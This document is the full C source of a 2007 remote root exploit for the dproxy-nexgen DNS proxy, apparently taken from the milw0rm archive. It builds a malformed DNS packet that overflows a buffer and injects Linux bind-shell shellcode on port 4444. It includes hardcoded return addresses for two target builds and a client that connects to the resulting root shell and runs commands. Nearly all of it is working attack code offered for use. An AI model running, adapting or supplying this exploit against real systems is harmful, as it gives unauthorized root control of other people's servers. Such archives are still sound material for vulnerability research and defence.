/* dproxy-v1.c
 *
 * Copyright (c) 2007 by <mu-b@digit-labs.org>
 *
 * dproxy-nexgen remote root exploit (x86-lnx)
 * by mu-b - Mar 2007
 *
 * - Tested on: dproxy-nexgen (.tar.gz)
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; version 2 of the License.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * http://www.digit-labs.org/ -- Digit-Labs 2007!@$!
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>

#define BUF_SIZE    512
#define NOP         0x41

#define DEF_PORT    53
#define PORT_DNS    DEF_PORT
#define PORT_SHELL  4444

const u_char bndshell_lnx[] =
  "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96"
  "\x43\x52\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56"
  "\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1"
  "\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
  "\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
  "\x89\xe1\xcd\x80";

#define NUM_TARGETS 2

struct target_t
{
  const u_char *name;
  const int len;
  const int zshell_pos;
  const u_char *zshell;
  const int fp_pos;
  const u_long fp;
};

/* fp = objdump -D dproxy | grep "ff e2" */
struct target_t targets[] = {
  {"dproxy-nexgen (tar.gz)",
   512, 25, bndshell_lnx, 284, 0x08048cf9}
  ,
  {"dproxy-nexgen (tar.gz, Debian stable)",
   512, 25, bndshell_lnx, 281, 0x08048cf8}
  ,
  {0}
};

static int sock_send (int sock, u_char * src, int len);
static int sock_recv (int sock, u_char * dst, int len);
static void sock_send_udp (u_char * host, int port, u_char * src, int len);
static int sockami (u_char * host, int port);
static void shellami (int sock);
static void zbuffami (u_char * zbuf, struct target_t *trgt);

static int
sock_send (int sock, u_char * src, int len)
{
  int sbytes;

  sbytes = send (sock, src, len, 0);

  return (sbytes);
}

static int
sock_recv (int sock, u_char * dst, int len)
{
  int rbytes;

  rbytes = recv (sock, dst, len, 0);
  if (rbytes >= 0)
    dst[rbytes] = '\0';

  return (rbytes);
}

static void
sock_send_udp (u_char * host, int port, u_char * src, int len)
{
  struct sockaddr_in address;
  struct hostent *hp;
  int sock;

  fflush (stdout);
  if ((sock = socket (AF_INET, SOCK_DGRAM, 0)) == -1)
    {
      perror ("socket()");
      exit (-1);
    }

  if ((hp = gethostbyname (host)) == NULL)
    {
      perror ("gethostbyname()");
      exit (-1);
    }

  memset (&address, 0, sizeof (address));
  memcpy ((char *) &address.sin_addr, hp->h_addr, hp->h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons (port);

  sendto (sock, src, len, 0, (struct sockaddr *) &address, sizeof (address));
}

static int
sockami (u_char * host, int port)
{
  struct sockaddr_in address;
  struct hostent *hp;
  int sock;

  fflush (stdout);
  if ((sock = socket (AF_INET, SOCK_STREAM, 0)) == -1)
    {
      perror ("socket()");
      exit (-1);
    }

  if ((hp = gethostbyname (host)) == NULL)
    {
      perror ("gethostbyname()");
      exit (-1);
    }

  memset (&address, 0, sizeof (address));
  memcpy ((char *) &address.sin_addr, hp->h_addr, hp->h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons (port);

  if (connect (sock, (struct sockaddr *) &address, sizeof (address)) == -1)
    {
      perror ("connect()");
      exit (EXIT_FAILURE);
    }

  return (sock);
}

static void
shellami (int sock)
{
  int n;
  fd_set rset;
  u_char recvbuf[1024], *cmd = "id; uname -a; uptime\n";

  sock_send (sock, cmd, strlen (cmd));

  while (1)
    {
      FD_ZERO (&rset);
      FD_SET (sock, &rset);
      FD_SET (STDIN_FILENO, &rset);
      select (sock + 1, &rset, NULL, NULL, NULL);
      if (FD_ISSET (sock, &rset))
        {
          if ((n = sock_recv (sock, recvbuf, sizeof (recvbuf) - 1)) <= 0)
            {
              fprintf (stderr, "Connection closed by foreign host.\n");
              exit (EXIT_SUCCESS);
            }
          printf ("%s", recvbuf);
        }
      if (FD_ISSET (STDIN_FILENO, &rset))
        {
          if ((n = read (STDIN_FILENO, recvbuf, sizeof (recvbuf) - 1)) > 0)
            {
              recvbuf[n] = '\0';
              sock_send (sock, recvbuf, n);
            }
        }
    }
}

static void
zbuffami (u_char * zbuf, struct target_t *trgt)
{
  int i;
  u_char *ptr;
  
  ptr = zbuf;
  memset (ptr, NOP, trgt->len);

  *ptr++ = 0x69; /* transaction id */
  *ptr++ = 0x69;
  *ptr++ = 0x81; /* flags */
  *ptr++ = 0x80;
  *ptr++ = 0x00; /* number of questions */
  *ptr++ = 0x00;
  *ptr++ = 0x00; /* number of answers */
  *ptr++ = 0x01;
  *ptr++ = 0x00; /* number of authority rr's */
  *ptr++ = 0x00;
  *ptr++ = 0x00; /* number of additional rr's */
  *ptr++ = 0x00;

  *ptr++ = 0xc0; /* compressed name &ptr+18 */
  *ptr++ = 0x18;
  *ptr++ = 0x00; /* type = PTR */
  *ptr++ = 0x0c;
  *ptr++ = 0x07; /* class = jmp short +0x07 */
  *ptr++ = 0xeb;

  *ptr++ = 0xff; /* ttl */
  *ptr++ = 0xff;
  *ptr++ = 0xff;
  *ptr++ = 0xff;

  *ptr++ = 0x01; /* data length = 488 bytes */
  *ptr++ = 0xe8;

  /* wire format name */
  for (i = 0; i < 2; i++, ptr += 0x7f) {
    *ptr++ = 0x7f;
    memset (ptr, NOP, 0x7f);
  }

  *ptr++ = 0x02; /* padding */
  *ptr++ = NOP;
  *ptr++ = NOP;
  *ptr++ = 0x00; /* terminate name */
  
  /* terminate buffer */
  ptr = zbuf + trgt->len - 1;
  *ptr-- = 0x2e;
  *ptr   = 0x2e;

  memcpy (zbuf + trgt->zshell_pos, trgt->zshell, strlen (trgt->zshell));

  zbuf[trgt->fp_pos] = (u_char) (trgt->fp & 0x000000ff);
  zbuf[trgt->fp_pos + 1] = (u_char) ((trgt->fp & 0x0000ff00) >> 8);
  zbuf[trgt->fp_pos + 2] = (u_char) ((trgt->fp & 0x00ff0000) >> 16);
  zbuf[trgt->fp_pos + 3] = (u_char) ((trgt->fp & 0xff000000) >> 24);
}

int
main (int argc, char **argv)
{
  int sock;
  u_char zbuf[BUF_SIZE];
  struct target_t *trgt;

  printf ("dproxy-nexgen remote root exploit\n"
          "by: <mu-b@digit-labs.org>\n"
	  "http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n");

  if (argc <= 2)
    {
      fprintf (stderr, "Usage: %s <host> <target>\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  if (atoi (argv[2]) >= NUM_TARGETS)
    {
      fprintf (stderr, "Only %d targets known!!\n", NUM_TARGETS);
      exit (EXIT_SUCCESS);
    }

  trgt = &targets[atoi (argv[2])];
  printf ("+Attacking to %s...\n", argv[1]);

  printf ("fp: 0x%x\n", (int) trgt->fp);
  printf ("buf len: %d\n", trgt->len);

  printf ("+Building buffer with shellcode...");
  memset (zbuf, 0x00, sizeof (zbuf));
  zbuffami (zbuf, trgt);
  printf ("  done\n");

  printf ("+Sending Payload...");
  sock_send_udp (argv[1], PORT_DNS, zbuf, BUF_SIZE);
  printf ("  done\n");

  printf ("+Waiting for the shellcode to be executed...\n");
  sleep (1);
  sock = sockami (argv[1], PORT_SHELL);
  printf ("+Wh00t!\n\n");
  shellami (sock);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2007-03-30]
